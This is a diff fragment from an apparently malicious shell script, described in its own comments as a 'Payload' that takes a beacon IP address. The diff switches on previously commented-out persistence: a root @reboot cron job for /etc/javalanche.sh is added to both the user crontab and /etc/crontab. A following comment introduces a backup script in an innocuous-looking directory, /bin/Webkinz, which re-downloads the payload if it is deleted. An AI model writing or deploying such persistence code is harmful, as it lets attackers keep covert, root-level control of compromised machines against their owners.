@@ -9,9 +9,9 @@ fi
 beaconIPAddress="$1"
 
 # Cronjob for this Payload to run on Boot
-#cronjob="@reboot root /etc/javalanche.sh $beaconIPAddress"
-#(crontab -l ; echo "\n $cronjob") | crontab -
-#echo "$cronjob" | sudo tee -a /etc/crontab > /dev/null
+cronjob="@reboot root /etc/javalanche.sh $beaconIPAddress"
+(crontab -l ; echo "\n $cronjob") | crontab -
+echo "$cronjob" | sudo tee -a /etc/crontab > /dev/null
 
 # Create a backup script to ensure the main payload is downloaded if deleted
 backup_dir="/bin/Webkinz"
